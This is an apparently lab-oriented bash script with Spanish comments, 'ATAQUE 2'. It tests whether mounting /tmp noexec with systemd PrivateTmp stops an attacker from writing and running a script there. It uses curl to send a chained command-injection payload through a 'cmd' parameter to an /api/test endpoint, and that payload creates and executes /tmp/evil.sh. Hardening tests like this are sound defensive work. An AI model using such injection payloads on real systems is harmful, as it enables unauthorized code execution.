#!/usr/bin/env bash
# =============================================================================
# ATAQUE 2 - ESCRIBIR Y EJECUTAR EN /tmp
# Prueba: /tmp montado con noexec + PrivateTmp de systemd
# Idea: un atacante tipico sube un programa a una carpeta donde puede escribir
#       (/tmp) y lo ejecuta. Aqui la app escribe un script en /tmp, lo hace
#       ejecutable y lo corre. Si /tmp es 'noexec', el SO impide ejecutarlo
#       aunque el archivo se haya escrito.
# Uso:  ./ataque2.sh            (ataca localhost:8080)
#       ./ataque2.sh IP:PUERTO  (ataca otra maquina)
# =============================================================================

TARGET="${1:-localhost:8080}"
API="http://$TARGET/api/test"

# Un solo comando encadenado (por eso necesitabamos bash -c en la ruta):
#   1) printf  -> escribe el script en /tmp/evil.sh
#   2) chmod +x -> lo marca como ejecutable
#   3) /tmp/evil.sh -> lo ejecuta COMO ARCHIVO (asi se prueba el noexec)
PAYLOAD='printf "#!/bin/sh\necho EJECUTADO en /tmp como \$(whoami)\n" > /tmp/evil.sh; chmod +x /tmp/evil.sh; /tmp/evil.sh'

echo "################ ATAQUE 2 - EJECUCION EN /tmp (contra $TARGET) ################"
echo
echo ">> La app escribira /tmp/evil.sh, lo hara ejecutable y lo correra."
echo "--------------------------------------------------------------"
curl -s -G "$API" --data-urlencode "cmd=$PAYLOAD"
echo
echo

# NOTA: a proposito NO se borra /tmp/evil.sh. Queda como evidencia de que
# la app escribio y ejecuto un archivo dentro de /tmp (o de que el SO
# blindado se lo impidio). Revisalo con: ls -la /tmp/evil.sh ; cat /tmp/evil.sh
echo "################ FIN ATAQUE 2 ################"
